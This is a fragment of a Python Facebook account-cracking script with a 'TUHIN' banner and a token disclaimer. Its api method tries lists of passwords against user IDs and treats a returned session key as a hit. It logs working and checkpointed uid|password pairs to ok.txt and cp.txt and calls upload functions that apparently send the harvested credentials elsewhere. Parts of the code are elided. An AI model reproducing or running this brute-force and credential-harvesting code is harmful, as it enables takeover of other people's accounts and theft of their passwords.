...
\033[0;94m     888       888       8   888     888   888   8     `88b.8  
\033[0;95m     888       `88.    .8'   888     888   888   8       `888  
\033[0;96m    o888o        `YbodP'    o888o   o888o o888o o8o        `8  
 ...
 > \033[0;97mWARNING       : DONT USE FOR ILLEGAL WORK     
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [TUHIN] : %s/%s -> \033[0;92m [ TUHIN-OK:%s ]- \033[0;93m[TUHIN-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[TUHIN-OK😍] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [TUHIN-OK😍] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[TUHIN-CP😭] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [TUHIN-CP😭] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
